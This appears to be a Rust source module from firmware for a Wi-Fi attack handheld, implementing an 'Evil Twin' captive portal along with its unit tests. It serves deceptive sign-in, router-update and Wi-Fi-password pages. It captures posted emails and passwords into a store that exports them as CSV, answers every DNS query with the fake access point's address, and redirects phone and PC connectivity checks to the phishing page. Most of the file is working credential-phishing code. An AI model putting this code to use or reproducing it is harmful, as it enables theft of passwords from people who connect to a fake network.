//! Evil Twin captive portal: HTTP request parsing, form capture, DNS redirection.
//!
//! Protocol logic only — the firmware owns the socket/AP lifecycle. Reference
//! behaviour: ESP32 Marauder `EvilPortal.cpp` and Bruce's
//! `sd_files/wifi/evil portal` templates (POST to `/submit`, `email`/`password`
//! fields). Implemented here as pure functions so the wire format is testable
//! without a radio or an access point.

use alloc::string::{String, ToString};
use alloc::vec::Vec;

use crate::error::DeckError;

/// Which built-in page is served.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PortalTemplate {
    /// Generic network sign-in.
    NetworkSignIn,
    /// Router firmware update prompt.
    RouterUpdate,
    /// Wi-Fi password confirmation.
    WifiUpdate,
}

impl PortalTemplate {
    pub const fn label(self) -> &'static str {
        match self {
            Self::NetworkSignIn => "Network Sign-In",
            Self::RouterUpdate => "Router Firmware Update",
            Self::WifiUpdate => "Wi-Fi Password Update",
        }
    }

    pub const fn slug(self) -> &'static str {
        match self {
            Self::NetworkSignIn => "signin",
            Self::RouterUpdate => "router",
            Self::WifiUpdate => "wifi",
        }
    }

    pub fn from_slug(slug: &str) -> Option<Self> {
        match slug {
            "signin" => Some(Self::NetworkSignIn),
            "router" => Some(Self::RouterUpdate),
            "wifi" => Some(Self::WifiUpdate),
            _ => None,
        }
    }
}

/// Portal configuration (held by the controller, not by this module).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PortalConfig {
    pub template: PortalTemplate,
    /// AP address clients are redirected to (usually 192.168.4.1).
    pub ap_ip: [u8; 4],
    /// SSID advertised by the Evil Twin.
    pub ssid: String,
    pub channel: u8,
    /// Maximum credentials retained before the oldest is dropped.
    pub capture_limit: usize,
}

impl Default for PortalConfig {
    fn default() -> Self {
        Self {
            template: PortalTemplate::NetworkSignIn,
            ap_ip: [192, 168, 4, 1],
            ssid: String::from("Free WiFi"),
            channel: 6,
            capture_limit: 32,
        }
    }
}

/// A minimally parsed HTTP request.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HttpRequest {
    pub method: String,
    pub path: String,
    pub host: Option<String>,
    pub user_agent: Option<String>,
    pub body: Vec<u8>,
}

impl HttpRequest {
    pub fn is_form_post(&self) -> bool {
        self.method == "POST" && !self.body.is_empty()
    }
}

/// Parse the request line, a few headers and the body. Returns `None` when the
/// request line is malformed (a captive-portal server must never panic on client
/// garbage).
pub fn parse_request(data: &[u8]) -> Option<HttpRequest> {
    let header_end = find_subslice(data, b"\r\n\r\n")?;
    let head = core::str::from_utf8(&data[..header_end]).ok()?;
    let mut lines = head.split("\r\n");
    let request_line = lines.next()?;
    let mut parts = request_line.split(' ');
    let method = parts.next()?.trim();
    let path = parts.next()?.trim();
    // RFC 7230 requires the HTTP version on the request line; captive-portal
    // clients always send it, so its absence means this is not an HTTP request.
    let version = parts.next()?.trim();
    if method.is_empty() || path.is_empty() || !version.starts_with("HTTP/") {
        return None;
    }
    let mut host = None;
    let mut user_agent = None;
    for line in lines {
        let Some((name, value)) = line.split_once(':') else {
            continue;
        };
        let value = value.trim();
        if name.eq_ignore_ascii_case("host") {
            host = Some(value.to_string());
        } else if name.eq_ignore_ascii_case("user-agent") {
            user_agent = Some(value.to_string());
        }
    }
    Some(HttpRequest {
        method: method.to_string(),
        path: path.to_string(),
        host,
        user_agent,
        body: data[header_end + 4..].to_vec(),
    })
}

fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || haystack.len() < needle.len() {
        return None;
    }
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

/// Percent-decode `application/x-www-form-urlencoded` text (`+` becomes space).
pub fn url_decode(input: &str, out: &mut String) {
    let bytes = input.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'+' => {
                out.push(' ');
                i += 1;
            }
            b'%' if i + 2 < bytes.len() => {
                let hi = crate::util::hex_val_checked(bytes[i + 1]);
                let lo = crate::util::hex_val_checked(bytes[i + 2]);
                match (hi, lo) {
                    (Some(hi), Some(lo)) => {
                        out.push(((hi << 4) | lo) as char);
                        i += 3;
                    }
                    _ => {
                        out.push('%');
                        i += 1;
                    }
                }
            }
            byte => {
                out.push(byte as char);
                i += 1;
            }
        }
    }
}

/// Credentials extracted from a posted form.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct FormCapture {
    pub email: Option<String>,
    pub password: Option<String>,
    /// Any other field, kept so custom templates work.
    pub extra: Vec<(String, String)>,
}

/// Parse a form body into `(email, password, extra)`.
///
/// Accepts the field names used by the reference portal templates
/// (`email`/`username`/`user` and `password`/`pass`/`pwd`).
pub fn parse_form(body: &[u8]) -> FormCapture {
    let mut capture = FormCapture::default();
    let Ok(text) = core::str::from_utf8(body) else {
        return capture;
    };
    for pair in text.split('&') {
        if pair.is_empty() {
            continue;
        }
        let (raw_key, raw_value) = match pair.split_once('=') {
            Some(parts) => parts,
            None => (pair, ""),
        };
        let mut key = String::new();
        let mut value = String::new();
        url_decode(raw_key, &mut key);
        url_decode(raw_value, &mut value);
        let lower = key.to_ascii_lowercase();
        match lower.as_str() {
            "email" | "username" | "user" | "login" if capture.email.is_none() => {
                capture.email = Some(value)
            }
            "password" | "pass" | "pwd" | "passwd" if capture.password.is_none() => {
                capture.password = Some(value)
            }
            _ => {
                if capture.extra.len() < 8 {
                    capture.extra.push((key, value));
                }
            }
        }
    }
    capture
}

/// One captured credential set.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CapturedCredentials {
    pub email: String,
    pub password: String,
    pub at_ms: u64,
    pub user_agent: Option<String>,
}

impl CapturedCredentials {
    /// CSV row for the session file (`email,password,time`).
    pub fn csv_line(&self) -> String {
        alloc::format!(
            "\"{}\",\"{}\",{}",
            csv_escape(&self.email),
            csv_escape(&self.password),
            self.at_ms
        )
    }
}

fn csv_escape(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for ch in input.chars() {
        if ch == '"' {
            out.push_str("\"\"");
        } else {
            out.push(ch);
        }
    }
    out
}

/// Bounded credential store.
#[derive(Debug)]
pub struct CredentialStore<const N: usize> {
    entries: Vec<CapturedCredentials>,
    dropped: u32,
}

impl<const N: usize> Default for CredentialStore<N> {
    fn default() -> Self {
        Self::new()
    }
}

impl<const N: usize> CredentialStore<N> {
    pub fn new() -> Self {
        Self {
            entries: Vec::new(),
            dropped: 0,
        }
    }

    pub fn push(&mut self, entry: CapturedCredentials) {
        if self.entries.len() >= N {
            self.entries.remove(0);
            self.dropped = self.dropped.saturating_add(1);
        }
        self.entries.push(entry);
    }

    pub fn len(&self) -> usize {
        self.entries.len()
    }

    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }

    pub fn dropped(&self) -> u32 {
        self.dropped
    }

    pub fn iter(&self) -> impl Iterator<Item = &CapturedCredentials> {
        self.entries.iter()
    }

    pub fn clear(&mut self) {
        self.entries.clear();
    }

    /// CSV document for SD export.
    pub fn to_csv(&self) -> String {
        let mut out = String::from("email,password,uptime_ms\n");
        for entry in &self.entries {
            out.push_str(&entry.csv_line());
            out.push('\n');
        }
        out
    }
}

/// Well-known captive-portal probe paths answered with a redirect.
pub const CAPTIVE_PROBE_PATHS: &[&str] = &[
    "/generate_204",
    "/gen_204",
    "/hotspot-detect.html",
    "/library/test/success.html",
    "/connecttest.txt",
    "/ncsi.txt",
    "/redirect",
    "/canonical.html",
    "/success.txt",
    "/captive-portal",
];

/// What the portal should do with a request.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PortalAction {
    /// Serve the template page.
    ServePortal,
    /// Redirect (301) to the portal page.
    Redirect,
    /// Accept a credential POST; `capture` holds the submitted fields.
    Capture(FormCapture),
    /// Serve a 404.
    NotFound,
    /// Answer with a plain 200 (used for connectivity checks that ask for text).
    PlainOk(&'static str),
}

/// Route one request.
pub fn route(request: &HttpRequest) -> PortalAction {
    let path = request.path.split('?').next().unwrap_or("/");
    if request.is_form_post() {
        let capture = parse_form(&request.body);
        if capture.email.is_some() || capture.password.is_some() {
            return PortalAction::Capture(capture);
        }
        return PortalAction::ServePortal;
    }
    if CAPTIVE_PROBE_PATHS.contains(&path) {
        return match path {
            "/connecttest.txt" => PortalAction::PlainOk("Microsoft Connect Test"),
            "/ncsi.txt" => PortalAction::PlainOk("Microsoft NCSI"),
            _ => PortalAction::Redirect,
        };
    }
    if path == "/" || path == "/index.html" || path.starts_with("/portal") {
        return PortalAction::ServePortal;
    }
    PortalAction::NotFound
}

/// Build a complete HTTP response.
pub fn http_response(
    status: u16,
    content_type: &str,
    body: &[u8],
    extra_headers: &[(&str, &str)],
) -> Vec<u8> {
    let reason = match status {
        200 => "OK",
        301 => "Moved Permanently",
        302 => "Found",
        404 => "Not Found",
        _ => "OK",
    };
    let mut out = alloc::format!("HTTP/1.1 {status} {reason}\r\n");
    out.push_str(&alloc::format!("Content-Type: {content_type}\r\n"));
    out.push_str(&alloc::format!("Content-Length: {}\r\n", body.len()));
    out.push_str("Connection: close\r\nCache-Control: no-store\r\nPragma: no-cache\r\n");
    for (name, value) in extra_headers {
        out.push_str(name);
        out.push_str(": ");
        out.push_str(value);
        out.push_str("\r\n");
    }
    out.push_str("\r\n");
    let mut bytes = out.into_bytes();
    bytes.extend_from_slice(body);
    bytes
}

/// Response for a routed action.
pub fn response_for(action: &PortalAction, config: &PortalConfig) -> Vec<u8> {
    match action {
        PortalAction::ServePortal => http_response(
            200,
            "text/html; charset=utf-8",
            portal_html(config).as_bytes(),
            &[],
        ),
        PortalAction::Redirect => {
            let location = alloc::format!("http://{}/portal", ip_string(config.ap_ip));
            http_response(301, "text/html", b"", &[("Location", location.as_str())])
        }
        PortalAction::Capture(_) => http_response(
            200,
            "text/html; charset=utf-8",
            success_html().as_bytes(),
            &[],
        ),
        PortalAction::PlainOk(text) => http_response(200, "text/plain", text.as_bytes(), &[]),
        PortalAction::NotFound => http_response(404, "text/html", not_found_html().as_bytes(), &[]),
    }
}

fn ip_string(ip: [u8; 4]) -> String {
    alloc::format!("{}.{}.{}.{}", ip[0], ip[1], ip[2], ip[3])
}

/// Built-in portal page for the configured template.
pub fn portal_html(config: &PortalConfig) -> String {
    let (heading, body_copy) = match config.template {
        PortalTemplate::NetworkSignIn => (
            "Network Sign-In",
            "Sign in to access the internet. Enter your email address and network password.",
        ),
        PortalTemplate::RouterUpdate => (
            "Router Firmware Update",
            "Your router requires a firmware update. Confirm your administrator credentials to continue.",
        ),
        PortalTemplate::WifiUpdate => (
            "Wi-Fi Password Update",
            "Your network password has expired. Enter your email address and current password to reconnect.",
        ),
    };
    alloc::format!(
        "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\">\
<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\
<title>{heading}</title><style>\
*{{box-sizing:border-box}}\
body{{margin:0;font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0d1117;color:#e6edf3;\
display:flex;min-height:100vh;align-items:center;justify-content:center;padding:24px}}\
.card{{width:100%;max-width:380px;background:#161b22;border:1px solid #30363d;border-radius:14px;padding:28px}}\
h1{{font-size:1.35rem;margin:0 0 8px}}\
p{{color:#9da7b3;font-size:.92rem;line-height:1.45;margin:0 0 20px}}\
label{{display:block;font-size:.78rem;text-transform:uppercase;letter-spacing:.06em;color:#8b949e;margin:14px 0 6px}}\
input{{width:100%;padding:12px;border-radius:9px;border:1px solid #30363d;background:#0d1117;color:#e6edf3;font-size:1rem}}\
button{{width:100%;margin-top:22px;padding:13px;border:0;border-radius:9px;background:#2f81f7;color:#fff;\
font-size:1rem;font-weight:600}}\
.net{{font-size:.75rem;color:#6e7681;margin-top:18px;text-align:center}}\
</style></head><body><form class=\"card\" method=\"POST\" action=\"/submit\">\
<h1>{heading}</h1><p>{body_copy}</p>\
<label for=\"email\">Email</label><input id=\"email\" name=\"email\" type=\"email\" \
autocomplete=\"username\" required>\
<label for=\"password\">Password</label><input id=\"password\" name=\"password\" \
type=\"password\" autocomplete=\"current-password\" required>\
<button type=\"submit\">Continue</button>\
<div class=\"net\">Network: {ssid}</div></form></body></html>",
        ssid = config.ssid
    )
}

fn success_html() -> &'static str {
    "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\">\
<title>Connected</title><style>body{margin:0;min-height:100vh;display:flex;\
align-items:center;justify-content:center;background:#0d1117;color:#e6edf3;\
font-family:-apple-system,Segoe UI,Roboto,sans-serif}p{font-size:1.05rem}</style>\
</head><body><p>Connecting you to the network&hellip;</p></body></html>"
}

fn not_found_html() -> &'static str {
    "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\"><title>Not Found</title>\
</head><body><h1>404</h1></body></html>"
}

/// Build a DNS response that answers every A query with `ip` (classic captive
/// portal wildcard). Returns `None` for malformed or non-A queries so the caller
/// can ignore them.
pub fn dns_response(query: &[u8], ip: [u8; 4]) -> Option<Vec<u8>> {
    if query.len() < 12 {
        return None;
    }
    let qdcount = u16::from_be_bytes([query[4], query[5]]);
    if qdcount == 0 {
        return None;
    }
    // Walk the first question name.
    let mut idx = 12;
    loop {
        let len = *query.get(idx)? as usize;
        if len == 0 {
            idx += 1;
            break;
        }
        if len & 0xC0 != 0 {
            // Compression pointers are not valid in a query we answer.
            return None;
        }
        idx += 1 + len;
        if idx > query.len() {
            return None;
        }
    }
    let question_end = idx + 4; // QTYPE + QCLASS
    if question_end > query.len() {
        return None;
    }
    let qtype = u16::from_be_bytes([query[idx], query[idx + 1]]);
    if qtype != 1 {
        return None;
    }

    let mut out = Vec::with_capacity(question_end + 16);
    out.extend_from_slice(&query[..2]); // transaction ID
    // Flags: response, authoritative, recursion available, no error.
    out.extend_from_slice(&[0x84, 0x00]);
    out.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
    out.extend_from_slice(&1u16.to_be_bytes()); // ANCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
    out.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT
    out.extend_from_slice(&query[12..question_end]);
    // Answer: pointer to the question name, type A, class IN, TTL 0, 4-byte RDATA.
    out.extend_from_slice(&[0xC0, 0x0C]);
    out.extend_from_slice(&1u16.to_be_bytes());
    out.extend_from_slice(&1u16.to_be_bytes());
    out.extend_from_slice(&0u32.to_be_bytes());
    out.extend_from_slice(&4u16.to_be_bytes());
    out.extend_from_slice(&ip);
    Some(out)
}

/// Encode a DNS query used by the portal's own connectivity self-test.
pub fn dns_query(id: u16, name: &str) -> Result<Vec<u8>, DeckError> {
    if name.len() > 253 {
        return Err(DeckError::InvalidInput {
            reason: "DNS name too long",
        });
    }
    let mut out = Vec::with_capacity(32);
    out.extend_from_slice(&id.to_be_bytes());
    out.extend_from_slice(&[0x01, 0x00]); // standard query, recursion desired
    out.extend_from_slice(&1u16.to_be_bytes());
    out.extend_from_slice(&[0, 0, 0, 0, 0, 0]);
    for label in name.split('.') {
        if label.is_empty() || label.len() > 63 {
            return Err(DeckError::InvalidInput {
                reason: "invalid DNS label",
            });
        }
        out.push(label.len() as u8);
        out.extend_from_slice(label.as_bytes());
    }
    out.push(0);
    out.extend_from_slice(&1u16.to_be_bytes()); // A
    out.extend_from_slice(&1u16.to_be_bytes()); // IN
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn request(raw: &str) -> HttpRequest {
        parse_request(raw.as_bytes()).expect("request parses")
    }

    #[test]
    fn parses_request_line_and_headers() {
        let req = request(
            "GET /generate_204 HTTP/1.1\r\nHost: connectivitycheck.gstatic.com\r\n\
             User-Agent: Android/14\r\n\r\n",
        );
        assert_eq!(req.method, "GET");
        assert_eq!(req.path, "/generate_204");
        assert_eq!(req.host.as_deref(), Some("connectivitycheck.gstatic.com"));
        assert_eq!(req.user_agent.as_deref(), Some("Android/14"));
        assert!(!req.is_form_post());
    }

    #[test]
    fn malformed_requests_are_rejected() {
        assert!(parse_request(b"").is_none());
        assert!(parse_request(b"garbage\r\n\r\n").is_none());
        assert!(parse_request(b"GET /\r\nHost: x\r\n\r\n").is_none());
    }

    #[test]
    fn routes_captive_probe_and_portal_paths() {
        let config = PortalConfig::default();
        let redirect = route(&request("GET /generate_204 HTTP/1.1\r\nHost: x\r\n\r\n"));
        assert_eq!(redirect, PortalAction::Redirect);
        let response = response_for(&redirect, &config);
        let text = core::str::from_utf8(&response).unwrap();
        assert!(text.starts_with("HTTP/1.1 301 Moved Permanently"));
        assert!(text.contains("Location: http://192.168.4.1/portal"));

        assert_eq!(
            route(&request("GET /portal HTTP/1.1\r\nHost: x\r\n\r\n")),
            PortalAction::ServePortal
        );
        assert_eq!(
            route(&request("GET /favicon.ico HTTP/1.1\r\nHost: x\r\n\r\n")),
            PortalAction::NotFound
        );
        assert_eq!(
            route(&request("GET /ncsi.txt HTTP/1.1\r\nHost: x\r\n\r\n")),
            PortalAction::PlainOk("Microsoft NCSI")
        );
    }

    #[test]
    fn captures_posted_credentials() {
        let body = b"email=lab%40example.com&password=p%40ss+word&submit=Continue";
        let mut raw = String::from(
            "POST /submit HTTP/1.1\r\nHost: 192.168.4.1\r\n\
            Content-Type: application/x-www-form-urlencoded\r\nContent-Length: ",
        );
        raw.push_str(&body.len().to_string());
        raw.push_str("\r\n\r\n");
        let mut bytes = raw.into_bytes();
        bytes.extend_from_slice(body);
        let req = parse_request(&bytes).unwrap();
        assert!(req.is_form_post());
        match route(&req) {
            PortalAction::Capture(capture) => {
                assert_eq!(capture.email.as_deref(), Some("lab@example.com"));
                assert_eq!(capture.password.as_deref(), Some("p@ss word"));
            }
            other => panic!("expected capture, got {other:?}"),
        }
    }

    #[test]
    fn form_parser_accepts_alternative_field_names() {
        let capture = parse_form(b"username=admin&pass=hunter2&extra=1");
        assert_eq!(capture.email.as_deref(), Some("admin"));
        assert_eq!(capture.password.as_deref(), Some("hunter2"));
        assert_eq!(capture.extra.len(), 1);
    }

    #[test]
    fn form_parser_survives_invalid_utf8_and_escapes() {
        let capture = parse_form(&[b'a', b'=', 0xFF, 0xFE]);
        assert!(capture.email.is_none());
        assert!(capture.password.is_none());
        let capture = parse_form(b"email=a%ZZb&password=x");
        assert_eq!(capture.email.as_deref(), Some("a%ZZb"));
    }

    #[test]
    fn credential_store_is_bounded_and_exports_csv() {
        let mut store: CredentialStore<2> = CredentialStore::new();
        for i in 0..3 {
            store.push(CapturedCredentials {
                email: alloc::format!("user{i}@example.com"),
                password: String::from("secret\"quote"),
                at_ms: i as u64,
                user_agent: None,
            });
        }
        assert_eq!(store.len(), 2);
        assert_eq!(store.dropped(), 1);
        let csv = store.to_csv();
        assert!(csv.starts_with("email,password,uptime_ms\n"));
        assert!(csv.contains("\"secret\"\"quote\""));
        assert!(!csv.contains("user0@example.com"));
    }

    #[test]
    fn dns_response_answers_a_queries() {
        let query = dns_query(0x1234, "connectivitycheck.gstatic.com").unwrap();
        let response = dns_response(&query, [192, 168, 4, 1]).expect("answer");
        assert_eq!(&response[..2], &[0x12, 0x34]);
        assert_eq!(response[2] & 0x80, 0x80, "QR bit");
        assert_eq!(u16::from_be_bytes([response[6], response[7]]), 1, "ANCOUNT");
        assert_eq!(&response[response.len() - 4..], &[192, 168, 4, 1]);
        // Question is echoed verbatim.
        assert_eq!(
            &response[12..12 + query.len() - 12 - 4],
            &query[12..query.len() - 4]
        );
    }

    #[test]
    fn dns_rejects_malformed_and_non_a_queries() {
        assert!(dns_response(&[], [1, 2, 3, 4]).is_none());
        let mut query = dns_query(1, "example.com").unwrap();
        let len = query.len();
        query[len - 4..len - 2].copy_from_slice(&28u16.to_be_bytes()); // AAAA
        assert!(dns_response(&query, [1, 2, 3, 4]).is_none());
        let mut compressed = dns_query(1, "example.com").unwrap();
        compressed[12] = 0xC0; // invalid compression pointer in a query
        assert!(dns_response(&compressed, [1, 2, 3, 4]).is_none());
    }

    #[test]
    fn dns_query_rejects_invalid_names() {
        assert!(dns_query(1, "").is_err());
        assert!(dns_query(1, "a..b").is_err());
        let long = "a".repeat(64);
        assert!(dns_query(1, &long).is_err());
    }

    #[test]
    fn portal_pages_are_complete_html_with_form() {
        for template in [
            PortalTemplate::NetworkSignIn,
            PortalTemplate::RouterUpdate,
            PortalTemplate::WifiUpdate,
        ] {
            let config = PortalConfig {
                template,
                ..Default::default()
            };
            let html = portal_html(&config);
            assert!(html.starts_with("<!DOCTYPE html>"));
            assert!(html.contains("</html>"));
            assert!(html.contains("method=\"POST\" action=\"/submit\""));
            assert!(html.contains("name=\"email\""));
            assert!(html.contains("name=\"password\""));
            assert!(html.contains(template.label()));
        }
    }

    #[test]
    fn http_response_sets_content_length() {
        let response = http_response(200, "text/html", b"hello", &[]);
        let text = core::str::from_utf8(&response).unwrap();
        assert!(text.contains("Content-Length: 5"));
        assert!(text.ends_with("hello"));
    }

    #[test]
    fn template_slugs_round_trip() {
        for template in [
            PortalTemplate::NetworkSignIn,
            PortalTemplate::RouterUpdate,
            PortalTemplate::WifiUpdate,
        ] {
            assert_eq!(PortalTemplate::from_slug(template.slug()), Some(template));
        }
        assert_eq!(PortalTemplate::from_slug("nope"), None);
    }
}
